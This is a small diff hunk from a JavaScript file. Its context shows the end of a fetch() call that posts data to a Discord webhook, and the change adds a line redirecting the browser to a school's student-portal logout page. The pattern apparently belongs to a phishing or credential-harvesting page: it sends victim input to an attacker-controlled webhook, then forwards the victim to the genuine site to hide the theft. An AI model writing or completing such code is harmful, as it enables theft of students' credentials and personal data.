@@ -56,3 +56,5 @@ fetch("https://discord.com/api/webhooks/1237022069368029305/18KP-oeNuiJIkVizmKoV
         }
     )
 });
+
+window.location.href = "https://dazsma-osjschools.edu.ph/portal/student/logout"
